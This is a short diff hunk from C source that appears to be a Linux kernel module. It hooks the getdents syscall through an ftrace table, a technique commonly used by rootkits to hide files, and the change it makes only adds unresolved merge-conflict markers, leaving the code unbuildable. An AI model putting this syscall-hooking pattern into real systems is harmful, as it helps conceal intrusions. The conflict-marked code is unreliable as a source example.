@@ -278,7 +278,10 @@ static struct ftrace_hook hooks[] = {
     	HOOK("__x64_sys_getdents", new_getdents, &orig_getdents),
 };
 
+<<<<<<< HEAD
 
+=======
+>>>>>>> d2b4fb55766274cc47f6cfde7cffde4791d62f1e
 unsigned long lookup_by_name(const char *name){
 	struct kprobe kp;
 	unsigned long r;
